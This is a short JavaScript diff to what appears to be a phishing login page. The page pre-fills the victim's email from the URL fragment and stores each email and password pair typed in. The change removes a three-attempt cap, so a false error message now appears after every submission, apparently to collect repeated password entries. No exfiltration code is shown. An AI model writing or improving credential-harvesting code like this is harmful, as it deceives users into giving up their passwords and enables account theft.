@@ -127,13 +127,7 @@ if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
       // Save attempt
       attempts.push({ email, password });
 
-      // Show error message
-      if (attempts.length < 3) {
-  errorMsg.style.display = "block";
-} else {
-  errorMsg.style.display = "none";
-  document.getElementById("message").style.display = "block";
-}
+      errorMsg.style.display = "block";
       
       // Remove error if user types again
       form.querySelectorAll("input").forEach(input => {
